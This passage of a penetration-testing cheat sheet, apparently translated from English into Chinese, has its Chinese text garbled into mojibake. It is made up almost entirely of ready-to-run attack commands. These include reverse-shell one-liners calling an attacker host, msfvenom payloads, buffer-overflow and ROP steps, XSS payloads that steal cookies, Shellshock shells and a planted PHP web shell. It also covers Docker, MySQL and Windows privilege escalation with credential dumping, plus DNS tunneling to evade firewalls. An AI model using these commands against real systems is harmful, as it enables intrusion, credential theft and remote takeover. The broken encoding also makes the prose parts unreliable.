2&gt;&amp;3&quot;);&apos; JAVA ÂèçÂºπ Shell123r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor() NETCAT ÂèçÂºπ Shell12345678910nc -e /bin/sh attackerip 4444nc -e /bin/sh 192.168.37.10 443# Â¶ÇÊûú -e ÂèÇÊï∞Ë¢´Á¶ÅÁî®ÔºåÂèØ‰ª•Â∞ùËØï‰ª•‰∏ãÂëΩ‰ª§# mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe/bin/sh | nc attackerip 443rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4443 0/tmp/# Â¶ÇÊûú‰Ω†ÂÆâË£ÖÈîô‰∫Ü netcat ÁöÑÁâàÊú¨ÔºåËØ∑Â∞ùËØï‰ª•‰∏ãÂëΩ‰ª§rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f TELNET ÂèçÂºπ Shell12# Â¶ÇÊûú netcat ‰∏çÂèØÁî®ÊàñËÄÖ /dev/tcpmknod backpipe p &amp;&amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe XTERM ÂèçÂºπ Shell12345678910111213141516# http://baike.baidu.com/view/418628.htm# ÂºÄÂêØ X ÊúçÂä°Âô® (:1 ‚Äì ÁõëÂê¨ TCP Á´ØÂè£ 6001)apt-get install xnestXnest :1# ËÆ∞ÂæóÊéàÊùÉÊù•Ëá™ÁõÆÊ†á IP ÁöÑËøûÊé•xterm -display 127.0.0.1:1# ÊéàÊùÉËÆøÈóÆxhost +targetip# Âú®ÁõÆÊ†áÊú∫Âô®‰∏äËøûÊé•ÂõûÊàë‰ª¨ÁöÑ X ÊúçÂä°Âô®xterm -display attackerip:1/usr/openwin/bin/xterm -display attackerip:1or$ DISPLAY=attackerip:0 xterm Windows ÁºìÂÜ≤Âå∫Ê∫¢Âá∫Âà©Áî®ÂëΩ‰ª§12msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b &quot;\x00&quot; -f cmsfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b &quot;\x00&quot; -f c COMMONLY USED BAD CHARACTERS:123456789101112131415161718192021\x00\x0a\x0d\x20 For http request\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c Ending with (0\n\r_)# Â∏∏Áî®ÂëΩ‰ª§:pattern createpattern offset (EIP Address)pattern offset (ESP Address)add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )!pvefindaddr pattern_create 5000!pvefindaddr suggest!pvefindaddr modules!pvefindaddr nosafeseh!mona config -set workingfolder C:\Mona\%p!mona config -get workingfolder!mona mod!mona bytearray -b &quot;\x00\x0a&quot;!mona pc 5000!mona po EIP!mona suggest SEH ‚Äì ÁªìÊûÑÂåñÂºÇÂ∏∏Â§ÑÁêÜ SEH(‚ÄúStructured Exception Handling‚Äù)ÔºåÂç≥ÁªìÊûÑÂåñÂºÇÂ∏∏Â§ÑÁêÜÔºåÊòØ windows Êìç‰ΩúÁ≥ªÁªüÊèê‰æõÁªôÁ®ãÂ∫èËÆæËÆ°ËÄÖÁöÑÂº∫ÊúâÂäõÁöÑÂ§ÑÁêÜÁ®ãÂ∫èÈîôËØØÊàñÂºÇÂ∏∏ÁöÑÊ≠¶Âô®„ÄÇ123456# https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH# http://baike.baidu.com/view/243131.htm!mona suggest!mona nosafesehnseh=&quot;\xeb\x06\x90\x90&quot; (next seh chain)iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN) ROP (DEP) ROP(‚ÄúReturn-Oriented Programming‚Äù)ÊòØËÆ°ÁÆóÊú∫ÂÆâÂÖ®ÊºèÊ¥ûÂà©Áî®ÊäÄÊúØÔºåËØ•ÊäÄÊúØÂÖÅËÆ∏ÊîªÂáªËÄÖÂú®ÂÆâÂÖ®Èò≤Âæ°ÁöÑÊÉÖÂÜµ‰∏ãÊâßË°å‰ª£Á†ÅÔºåÂ¶Ç‰∏çÂèØÊâßË°åÁöÑÂÜÖÂ≠òÂíå‰ª£Á†ÅÁ≠æÂêç„ÄÇ 123456789DEP(‚ÄúData Execution Prevention‚Äù)ÊòØ‰∏ÄÂ•óËΩØÁ°¨‰ª∂ÊäÄÊúØÔºåÂú®ÂÜÖÂ≠ò‰∏ä‰∏•Ê†ºÂ∞Ü‰ª£Á†ÅÂíåÊï∞ÊçÆËøõË°åÂå∫ÂàÜÔºåÈò≤Ê≠¢Êï∞ÊçÆÂΩìÂÅö‰ª£Á†ÅÊâßË°å„ÄÇ# https://en.wikipedia.org/wiki/Return-oriented_programming# https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B# https://en.wikipedia.org/wiki/Data_Execution_Prevention# http://baike.baidu.com/item/DEP/7694630!mona modules!mona ropfunc -m *.dll -cpb &quot;\x00\x09\x0a&quot;!mona rop -m *.dll -cpb &quot;\x00\x09\x0a&quot; (auto suggest) ##ASLR ‚Äì Âú∞ÂùÄÁ©∫Èó¥Ê†ºÂ±ÄÈöèÊú∫Âåñ 12# https://en.wikipedia.org/wiki/Address_space_layout_randomization# http://baike.baidu.com/view/3862310.htm ##ÂØªËõã(EGG Hunter)ÊäÄÊúØ Egg huntingËøôÁßçÊäÄÊúØÂèØ‰ª•Ë¢´ÂΩí‰∏∫‚ÄúÂàÜÁ∫ßshellcode‚ÄùÔºåÂÆÉ‰∏ªË¶ÅÂèØ‰ª•ÊîØÊåÅ‰Ω†Áî®‰∏ÄÂ∞èÊÆµÁâπÂà∂ÁöÑshellcodeÊù•ÊâæÂà∞‰Ω†ÁöÑÂÆûÈôÖÁöÑÔºàÊõ¥Â§ßÁöÑÔºâshellcodeÔºàÊàë‰ª¨ÁöÑ‚ÄòÈ∏°Ëõã‚ÄòÔºâÔºåÂéüÁêÜÂ∞±ÊòØÈÄöËøáÂú®ÂÜÖÂ≠ò‰∏≠ÊêúÁ¥¢Êàë‰ª¨ÁöÑÊúÄÁªàshellcode„ÄÇÊç¢Âè•ËØùËØ¥Ôºå‰∏ÄÊÆµÁü≠‰ª£Á†ÅÂÖàÊâßË°åÔºåÁÑ∂ÂêéÂÜçÂéªÂØªÊâæÁúüÊ≠£ÁöÑshellcodeÂπ∂ÊâßË°å„ÄÇ‚Äì ÂèÇËÄÉËá™ÁúãÈõ™ËÆ∫ÂùõÔºåÊõ¥Â§öËØ¶ÊÉÖÂèØ‰ª•Êü•ÈòÖÊàëÂú®‰ª£Á†ÅÊ≥®Èáä‰∏≠Â¢ûÂä†ÁöÑÈìæÊé•„ÄÇ 12345678# https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/# http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf# http://www.fuzzysecurity.com/tutorials/expDev/4.html!mona jmp -r esp!mona egg -t lxxl\xeb\xc4 (jump backward -60)buff=lxxllxxl+shell!mona egg -t &apos;w00t&apos; GDB Debugger Â∏∏Áî®ÂëΩ‰ª§12345678910111213141516171819202122232425262728293031323334# ËÆæÁΩÆÊñ≠ÁÇπbreak *_start# ÊâßË°å‰∏ã‰∏Ä‰∏™ÂëΩ‰ª§nextstepns# ÁªßÁª≠ÊâßË°åcontinuec# Êï∞ÊçÆchecking &apos;REGISTERS&apos; and &apos;MEMORY&apos;# ÊòæÁ§∫ÂØÑÂ≠òÂô®ÁöÑÂÄº: (Decimal,Binary,Hex)print /d ‚Äì&gt; Decimalprint /t ‚Äì&gt; Binaryprint /x ‚Äì&gt; HexO/P :(gdb) print /d $eax$17 = 13(gdb) print /t $eax$18 = 1101(gdb) print /x $eax$19 = 0xd(gdb)# ÊòæÁ§∫ÁâπÂÆöÂÜÖÂ≠òÂú∞ÂùÄÁöÑÂÄºcommand : x/nyz (Examine)n ‚Äì&gt; Number of fields to display ==&gt;y ‚Äì&gt; Format for output ==&gt; c (character) , d (decimal) , x (Hexadecimal)z ‚Äì&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit) XSS Â§áÂøòÂΩï123456789101112131415161718192021222324252627282930https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet(&quot;&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;&quot;)&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//‚Äì&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&quot;;!‚Äì&quot;&lt;XSS&gt;=&amp;amp;amp;&#123;()&#125;&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&quot;&gt;&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;perl -e &apos;print &quot;&lt;IMG SRC=javascript:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;(&quot;&gt;&lt; iframes http://google.com &lt; iframes &gt;)&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;FRAMESET&gt;&lt;FRAME SRC=‚Äùjavascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;%253cscript%253ealert(document.cookie)%253c/script%253e&quot;&gt;&lt;s&quot;%2b&quot;cript&gt;alert(document.cookie)&lt;/script&gt;%22/%3E%3CBODY%20onload=‚Äôdocument.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)&apos;%3E&lt;img src=asdf onerror=alert(document.cookie)&gt; SSH Over SCTP (‰ΩøÁî® Socat)1234567891011# ËøúÁ´ØÊúçÂä°Âô®# ÂÅáËÆæ‰Ω†ÂáÜÂ§áËÆ© SCTP socket ÁõëÂê¨Á´ØÂè£ 80/SCTP Âπ∂‰∏î sshd Á´ØÂè£Âú® 22/TCP$ socat SCTP-LISTEN:80,fork TCP:localhost:22# Êú¨Âú∞Á´Ø# Â∞Ü SERVER_IP Êç¢ÊàêËøúÁ´ØÊúçÂä°Âô®ÁöÑÂú∞ÂùÄÔºåÁÑ∂ÂêéÂ∞Ü 80 Êç¢Êàê SCTP ÁõëÂê¨ÁöÑÁ´ØÂè£Âè∑$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80# ÂàõÂª∫ socks ‰ª£ÁêÜ# ÊõøÊç¢ username Âíå -p ÁöÑÁ´ØÂè£Âè∑$ ssh -lusername localhost -D 8080 -p 1337 ‰ΩøÁî®Ê¥ãËë±ÁΩëÁªú12345678910111213141516171819# ÂÆâË£ÖÊúçÂä°$ apt-get install tor torsocks# ÁªëÂÆö ssh Âà∞ tor ÊúçÂä°Á´ØÂè£ 80# /etc/tor/torrcSocksPolicy accept 127.0.0.1SocksPolicy accept 192.168.0.0/16Log notice file /var/log/tor/notices.logRunAsDaemon 1HiddenServiceDir /var/lib/tor/ssh_hidden_service/HiddenServicePort 80 127.0.0.1:22PublishServerDescriptor 0$ /etc/init.d/tor start$ cat /var/lib/tor/ssh_hidden_service/hostname3l5zstvt1zk5jhl662.onion# ssh ÂÆ¢Êà∑Á´ØËøûÊé•$ apt-get install torsocks$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80 Metagoofil ‚Äì ÂÖÉÊï∞ÊçÆÊî∂ÈõÜÂ∑•ÂÖ∑ Metagoofil ÊòØ‰∏ÄÊ¨æÂà©Áî®GoogleÊî∂ÈõÜ‰ø°ÊÅØÁöÑÂ∑•ÂÖ∑„ÄÇ 123# http://www.edge-security.com/metagoofil.php# ÂÆÉÂèØ‰ª•Ëá™Âä®Âú®ÊêúÁ¥†ÂºïÊìé‰∏≠Ê£ÄÁ¥¢ÂíåÂàÜÊûêÊñá‰ª∂ÔºåËøòÂÖ∑ÊúâÊèê‰æõMacÂú∞ÂùÄÔºåÁî®Êà∑ÂêçÂàóË°®Á≠âÂÖ∂‰ªñÂäüËÉΩ$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html Âà©Áî® Shellshock12345678910111213# ‰∏Ä‰∏™ÂèëÁé∞Âπ∂Âà©Áî®ÊúçÂä°Âô® Shellshock ÁöÑÂ∑•ÂÖ∑# https://github.com/nccgroup/shocker$ ./shocker.py -H 192.168.56.118 --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose# Êü•ÁúãÊñá‰ª∂$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80# ÁªëÂÆö shell$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80# ÂèçÂºπ Shell$ nc -l -p 443$ echo &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80 Ëé∑Âèñ Docker ÁöÑ Root12345678910111213141516171819202122232425262728# Ëé∑Âèñ Docker ÁöÑ Root# user ÂøÖÈ°ªÂú® docker Áî®Êà∑ÁªÑ‰∏≠ek@victum:~/docker-test$ iduid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)ek@victum:~$ mkdir docker-testek@victum:~$ cd docker-testek@victum:~$ cat &gt; DockerfileFROM debian:wheezyENV WORKDIR /stuffRUN mkdir -p $WORKDIRVOLUME [ $WORKDIR ]WORKDIR $WORKDIR&lt;&lt; EOFek@victum:~$ docker build -t my-docker-image .ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \&apos;cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh&apos;./shwhoami# rootek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c &apos;cat /stuff/shadow&apos; ‰ΩøÁî® DNS ÈößÈÅìÁªïËøáÈò≤ÁÅ´Â¢ô12345678910111213141516171819202122232425# ËÆ©Êï∞ÊçÆÂíåÂëΩ‰ª§‰ΩøÁî® DNS ÈößÈÅì‰º†Ëæì‰ª•ÁªïËøáÈò≤ÁÅ´Â¢ôÁöÑÊ£ÄÊü•# dnscat2 ÊîØÊåÅ‰ªéÁõÆÊ†á‰∏ªÊú∫‰∏äÈù¢‰∏ä‰º†Âíå‰∏ãËΩΩÂëΩ‰ª§Êù•Ëé∑ÂèñÊñá‰ª∂„ÄÅÊï∞ÊçÆÂíåÁ®ãÂ∫è# ÊúçÂä°Âô® (ÊîªÂáªËÄÖ)$ apt-get update$ apt-get -y install ruby-dev git make g++$ gem install bundler$ git clone https://github.com/iagox86/dnscat2.git$ cd dnscat2/server$ bundle install$ ruby ./dnscat2.rbdnscat2&gt; New session established: 16059dnscat2&gt; session -i 16059# ÂÆ¢Êà∑Êú∫ (ÁõÆÊ†á)# https://downloads.skullsecurity.org/dnscat2/# https://github.com/lukebaggett/dnscat2-powershell$ dnscat --host &lt;dnscat server_ip&gt;ÁºñËØë Assemble ‰ª£Á†Å$ nasm -f elf32 simple32.asm -o simple32.o$ ld -m elf_i386 simple32.o simple32$ nasm -f elf64 simple.asm -o simple.o$ ld simple.o -o simple ‰ΩøÁî®Èùû‰∫§‰∫í Shell ÊâìÂÖ•ÂÜÖÁΩë1234567891011121314# ÁîüÊàê shell ‰ΩøÁî®ÁöÑ ssh ÂØÜÈí•$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=whoami&quot;$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \&quot;\&quot; &quot;$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot;# Â¢ûÂä†Áî®Êà∑ tempuser $ useradd -m tempuser$ mkdir /home/tempuser/.ssh &amp;&amp; chmod 700 /home/tempuser/.ssh$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot; &gt; /home/tempuser/.ssh/authorized_keys$ chmod 700 /home/tempuser/.ssh/authorized_keys$ chown -R tempuser:tempuser /home/tempuser/.ssh# ÂèçÂºπ ssh shell$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;&quot; Âà©Áî® POST ËøúÁ®ãÂëΩ‰ª§ÊâßË°åËé∑Âèñ Shell123456789101112attacker:~$ curl -i -s -k -X &apos;POST&apos; --data-binary $&apos;IP=%3Bwhoami&amp;submit=submit&apos; &apos;http://victum.tk/command.php&apos;attacker:~$ curl -i -s -k -X &apos;POST&apos; --data-binary $&apos;IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&amp;submit=submit&apos; &apos;http://victum.tk/command.php&apos;attacker:~$ curl http://victum.tk/shell.php?cmd=id# Âú®ÊúçÂä°Âô®‰∏ä‰∏ãËΩΩ shell (phpshell.php)http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27# ËøêË°å nc Âπ∂ÊâßË°å phpshell.phpattacker:~$ nc -nvlp 1337 ‰ª•ÁÆ°ÁêÜÂëòË∫´‰ªΩÂú® Win7 ‰∏äÂèçÂºπÂÖ∑ÊúâÁ≥ªÁªüÊùÉÈôêÁöÑ Shell12345678910111213141516171819202122232425262728293031323334353637383940414243msfvenom ‚Äìp windows/shell_reverse_tcp LHOST=192.168.56.102 ‚Äìf exe &gt; danger.exe# ÊòæÁ§∫Ë¥¶Êà∑ÈÖçÁΩÆnet user &lt;login&gt;# Kali ‰∏ä‰∏ãËΩΩ psexechttps://technet.microsoft.com/en-us/sysinternals/bb897553.aspx# ‰ΩøÁî® powershell ËÑöÊú¨‰∏ä‰º† psexec.exe Âà∞ÁõÆÊ†áÊú∫Âô®echo $client = New-Object System.Net.WebClient &gt; script.ps1echo $targetlocation = &quot;http://192.168.56.102/PsExec.exe&quot; &gt;&gt; script.ps1echo $client.DownloadFile($targetlocation,&quot;psexec.exe&quot;) &gt;&gt; script.ps1powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1# ‰ΩøÁî® powershell ËÑöÊú¨‰∏ä‰º† danger.exe Âà∞ÁõÆÊ†áÊú∫Âô®echo $client = New-Object System.Net.WebClient &gt; script2.ps1echo $targetlocation = &quot;http://192.168.56.102/danger.exe&quot; &gt;&gt; script2.ps1echo $client.DownloadFile($targetlocation,&quot;danger.exe&quot;) &gt;&gt; script2.ps1powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1# ‰ΩøÁî®È¢ÑÁºñËØëÁöÑ‰∫åËøõÂà∂Êñá‰ª∂ÁªïËøá UAC:https://github.com/hfiref0x/UACME# ‰ΩøÁî® powershell ËÑöÊú¨‰∏ä‰º† https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe Âà∞ÁõÆÊ†áÊú∫Âô®echo $client = New-Object System.Net.WebClient &gt; script2.ps1echo $targetlocation = &quot;http://192.168.56.102/Akagi64.exe&quot; &gt;&gt; script3.ps1echo $client.DownloadFile($targetlocation,&quot;Akagi64.exe&quot;) &gt;&gt; script3.ps1powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1# Âú® Kali ‰∏äÂàõÂª∫ÁõëÂê¨nc -lvp 4444# ‰ª•Á≥ªÁªüÊùÉÈôê‰ΩøÁî® Akagi64 ËøêË°å danger.exe Akagi64.exe 1 C:\Users\User\Desktop\danger.exe# Âú® Kali ‰∏äÂàõÂª∫ÁõëÂê¨nc -lvp 4444# ‰∏ã‰∏ÄÊ≠•Â∞±‰ºöÂèçÂºπÁªôÊàë‰ª¨‰∏Ä‰∏™ÊèêËøáÊùÉÁöÑ shell# ‰ª•Á≥ªÁªüÊùÉÈôê‰ΩøÁî® PsExec ËøêË°å danger.exe psexec.exe ‚Äìi ‚Äìd ‚Äìaccepteula ‚Äìs danger.exe ‰ª•ÊôÆÈÄöÁî®Êà∑Ë∫´‰ªΩÂú® Win7 ‰∏äÂèçÂºπÂÖ∑ÊúâÁ≥ªÁªüÊùÉÈôêÁöÑ Shell12345678910111213141516171819202122232425262728293031323334https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.htmlhttps://www.exploit-db.com/exploits/37049/# Êü•ÊâæÁõÆÊ†áÊú∫Âô®ÊòØÂê¶ÂÆâË£Ö‰∫ÜË°•‰∏ÅÔºåËæìÂÖ•Â¶Ç‰∏ãÂëΩ‰ª§wmic qfe getwmic qfe | find &quot;3057191&quot;# ‰∏ä‰º†ÁºñËØëÂêéÁöÑÂà©Áî®Á®ãÂ∫èÂπ∂ËøêË°åÂÆÉhttps://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe# ÈªòËÆ§ÊÉÖÂÜµ‰∏ãÂÖ∂‰ºö‰ª•Á≥ªÁªüÊùÉÈôêÊâßË°å cmd.exeÔºå‰ΩÜÊàë‰ª¨ÈúÄË¶ÅÊîπÂèòÊ∫ê‰ª£Á†Å‰ª•ËøêË°åÊàë‰ª¨‰∏ä‰º†ÁöÑ danger.exe# https://github.com/hfiref0x/CVE-2015-1701 ‰∏ãËΩΩÂÆÉÂπ∂ÂÆö‰ΩçÂà∞ &quot;main.c&quot;# ‰ΩøÁî® wce.exe Ëé∑ÂèñÂ∑≤ÁôªÂΩïÁî®Êà∑ÁöÑÊòéÊñáË¥¶Âè∑ÂØÜÁ†Åhttp://www.ampliasecurity.com/research/windows-credentials-editor/wce -w# ‰ΩøÁî® pwdump7 Ëé∑ÂèñÂÖ∂‰ªñÁî®Êà∑ÁöÑÂØÜÁ†ÅÂìàÂ∏åÂÄºhttp://www.heise.de/download/pwdump.html# we can try online hash cracking tools such crackstation.netMS08-067 ‚Äì ‰∏ç‰ΩøÁî® Metasploit$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205$ searchsploit ms08-067$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1 ÈÄöËøá MySQL Root Ë¥¶Êà∑ÂÆûÁé∞ÊèêÊùÉ12345678910111213141516171819# Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)$ wget 0xdeadbeef.info/exploits/raptor_udf2.c$ gcc -g -c raptor_udf2.c$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lcmysql -u root -pmysql&gt; use mysql;mysql&gt; create table foo(line blob);mysql&gt; insert into foo values(load_file(&apos;/home/user/raptor_udf2.so&apos;));mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf2.so&apos;;mysql&gt; create function do_system returns integer soname &apos;raptor_udf2.so&apos;;mysql&gt; select * from mysql.func;mysql&gt; select do_system(&apos;echo &quot;root:passwd&quot; | chpasswd &gt; /tmp/out; chown user:user /tmp/out&apos;);user:~$ su -Password:user:~# whoamirootroot:~# iduid=0(root) gid=0(root) groups=0(root) ‰ΩøÁî® LD_PRELOAD Ê≥®ÂÖ•Á®ãÂ∫è123$ wget https://github.com/jivoi/pentest/ldpreload_shell.c$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft ÈíàÂØπ OpenSSH Áî®Êà∑ËøõË°åÊûö‰∏æÊó∂Â∫èÊîªÂáª Êûö‰∏æÊó∂Â∫èÊîªÂáª(‚ÄúEnumeration Timing Attack‚Äù)Â±û‰∫é‰æß‰ø°ÈÅìÊîªÂáª/ÊóÅË∑ØÊîªÂáª(Side Channel Attack)Ôºå‰æß‰ø°ÈÅìÊîªÂáªÊòØÊåáÂà©Áî®‰ø°ÈÅìÂ§ñÁöÑ‰ø°ÊÅØÔºåÊØîÂ¶ÇÂä†Ëß£ÂØÜÁöÑÈÄüÂ∫¶/Âä†Ëß£ÂØÜÊó∂ËäØÁâáÂºïËÑöÁöÑÁîµÂéã/ÂØÜÊñá‰º†ËæìÁöÑÊµÅÈáèÂíåÈÄîÂæÑÁ≠âËøõË°åÊîªÂáªÁöÑÊñπÂºèÔºå‰∏Ä‰∏™ËØçÂΩ¢ÂÆπÂ∞±ÊòØ‚ÄúÊóÅÊï≤‰æßÂáª‚Äù„ÄÇ‚ÄìÂèÇËÄÉËá™ shotgun Âú®Áü•‰πé‰∏äÁöÑËß£Èáä„ÄÇosueta ÊòØ‰∏Ä‰∏™Áî®‰∫éÂØπ OpenSSH ËøõË°åÊó∂Â∫èÊîªÂáªÁöÑ python2 ËÑöÊú¨ÔºåÂÖ∂ÂèØ‰ª•Âà©Áî®Êó∂Â∫èÊîªÂáªÊûö‰∏æ OpenSSH Áî®Êà∑ÂêçÔºåÂπ∂Âú®‰∏ÄÂÆöÊù°‰ª∂‰∏ãÂèØ‰ª•ÂØπ OpenSSH ÊúçÂä°Âô®ËøõË°å DOS ÊîªÂáª„ÄÇ 123# https://github.com/c0r3dump3d/osueta$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes ‚Äìdos no -L userfile.txt ‰ΩøÁî® ReDuh ÊûÑÈÄ†ÂêàÊ≥ïÁöÑ HTTP ËØ∑Ê±Ç‰ª•Âª∫Á´ã TCP ÈÄöÈÅì ReDuh ÊòØ‰∏Ä‰∏™ÈÄöËøá HTTP ÂçèËÆÆÂª∫Á´ãÈößÈÅì‰º†ËæìÂêÑÁßçÂÖ∂‰ªñÊï∞ÊçÆÁöÑÂ∑•ÂÖ∑„ÄÇÂÖ∂ÂèØ‰ª•ÊääÂÜÖÁΩëÊúçÂä°Âô®ÁöÑÁ´ØÂè£ÈÄöËøá http/https ÈößÈÅìËΩ¨ÂèëÂà∞Êú¨Êú∫ÔºåÂΩ¢Êàê‰∏Ä‰∏™ËøûÈÄöÂõûË∑Ø„ÄÇÁî®‰∫éÁõÆÊ†áÊúçÂä°Âô®Âú®ÂÜÖÁΩëÊàñÂÅö‰∫ÜÁ´ØÂè£Á≠ñÁï•ÁöÑÊÉÖÂÜµ‰∏ãËøûÊé•ÁõÆÊ†áÊúçÂä°Âô®ÂÜÖÈÉ®ÂºÄÊîæÁ´ØÂè£„ÄÇ 123456789101112131415161718192021# https://github.com/sensepost/reDuh# Ê≠•È™§ 1# ‰∏ä‰º† reDuh.jsp ÁõÆÊ†áÊúçÂä°Âô®$ http://192.168.10.50/uploads/reDuh.jsp# Ê≠•È™§ 2# Âú®Êú¨Êú∫ËøêË°å reDuhClient $ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp# Ê≠•È™§ 3# ‰ΩøÁî® nc ËøûÊé•ÁÆ°ÁêÜÁ´ØÂè£$ nc -nvv 127.0.0.1 1010# Ê≠•È™§ 4# 